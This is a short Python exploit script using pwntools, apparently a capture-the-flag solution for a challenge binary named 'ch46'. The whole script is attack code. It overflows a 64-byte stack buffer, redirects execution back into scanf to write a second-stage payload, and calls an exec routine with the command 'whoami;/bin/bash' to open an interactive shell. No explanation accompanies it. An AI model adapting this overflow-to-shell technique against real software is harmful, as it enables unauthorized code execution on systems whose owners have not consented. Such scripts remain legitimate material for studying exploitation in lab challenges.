#!/usr/bin/python

from pwn import *

EXEC = 0x10584
RETURN_TO_SCANF = 0x10658
ADDR_TO_SCANF = 0x21901+0x60
PAYLOAD_ADDR = ADDR_TO_SCANF+4
CMD = "whoami;/bin/bash"

with open('/tmp/input', 'wb') as f:
    f.write("A"*64+p32(ADDR_TO_SCANF)+p32(RETURN_TO_SCANF)+"\n"+"\x00"*0x40+p32(PAYLOAD_ADDR+0x10)+p32(EXEC)+p32(PAYLOAD_ADDR+4)+CMD)

context.log_level = 'info'

r = process('./ch46')

r.recv()
r.sendline("A"*64+p32(ADDR_TO_SCANF)+p32(RETURN_TO_SCANF))
r.recv()
r.sendline("\x00"*0x40+p32(PAYLOAD_ADDR+0x10)+p32(EXEC)+p32(PAYLOAD_ADDR+4)+CMD)
r.recv()
r.interactive()
